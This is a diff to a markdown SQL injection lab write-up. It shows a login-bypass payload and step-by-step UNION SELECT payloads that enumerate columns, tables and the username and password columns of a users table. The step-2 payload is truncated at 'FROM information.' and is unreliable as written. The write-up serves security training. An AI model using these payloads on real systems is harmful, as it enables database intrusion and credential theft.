@@ -114,13 +114,16 @@ csrf=3TLWN8ZvFozxYt7SjEnHCylFECivXhjq&username=administrator'-- &password=test
 
 **Analisys:**
 1. Determine the number of columns that are being returned and which columns contain text data.
+
 ' UNION SELECT 'abc','def'--
 
 2. Retrieve the list of tables in the database to find the table containing user credentials.
-'+UNION+SELECT+table_name,+NULL+FROM+information.
+
+' UNION SELECT table_name, NULL FROM information.
 
 3. Retrieve the details of the columns in the table using the following payload.
-'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
 
 users_ussktm
 
@@ -131,8 +134,9 @@ users_ussktm
 
 4.1. Find the names of the columns containing usernames and passwords.
 
-username_uakwia
-password_resgsf
+username_uakwia.
+
+password_resgsf.
 
 5. Retrieve the usernames and passwords for all users using the following payload:
 
